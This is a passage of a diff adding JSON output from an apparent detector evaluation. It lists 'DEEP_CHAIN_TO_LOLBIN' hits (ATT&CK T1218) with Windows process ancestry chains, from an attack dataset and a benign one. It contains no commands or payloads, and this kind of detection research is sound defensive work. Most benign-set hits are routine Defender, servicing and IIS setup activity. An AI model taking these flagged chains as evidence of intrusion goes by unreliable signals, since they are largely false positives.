+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7db-5f51-6e00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7db-5f51-7100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7dc-5f51-7400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        }
+      ]
+    },
+    "benign": {
+      "unique_processes": 1274,
+      "uac_bypass_proxy_chain_hits": [],
+      "deep_chain_to_lolbin_hits": [
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee76-624a-2f00-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee77-624a-3100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\inetsrv\\iissetup.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee78-624a-3600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee7b-624a-3a00-000000000500",
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "lolbin_name": "regsvr32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\spoolsv.exe",
+            "C:\\Windows\\System32\\regsvr32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee7d-624a-3c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\snmp.exe",
+            "C:\\Windows\\SysWOW64\\snmp.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee7e-624a-3e00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee7e-624a-4000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee7e-624a-4200-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee80-624a-4500-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee81-624a-4600-000000000500",
+          "image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+          "lolbin_name": "regsvr32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\spoolsv.exe",
+            "C:\\Windows\\SysWOW64\\regsvr32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee82-624a-4800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee84-624a-4a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee86-624a-4c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee87-624a-4e00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee88-624a-5000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee88-624a-5200-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ee89-624a-5400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eea0-624a-5600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.20348.143_none_9220a02afa1f4845\\iissetup.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eea4-624a-5800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.20348.143_none_9220a02afa1f4845\\iissetup.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eea5-624a-5900-000000000500",
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "lolbin_name": "regsvr32.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.20348.143_none_9220a02afa1f4845\\iissetup.exe",
+            "C:\\Windows\\System32\\regsvr32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eeac-624a-5b00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.20348.143_none_9220a02afa1f4845\\iissetup.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eeb0-624a-5c00-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eeb1-624a-5e00-000000000500",
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "lolbin_name": "regsvr32.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.20348.143_none_9220a02afa1f4845\\iissetup.exe",
+            "C:\\Windows\\System32\\regsvr32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eeb7-624a-5f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eef6-624a-6100-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-eeff-624a-6200-000000000500",
+          "image": "C:\\Windows\\System32\\reg.exe",
+          "lolbin_name": "reg.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\reg.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ef67-624a-6900-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ef67-624a-6a00-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ef67-624a-6b00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-ef67-624a-6c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.557_none_f1edaeb8515fa10d\\TiWorker.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f105-624a-7900-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f105-624a-7a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
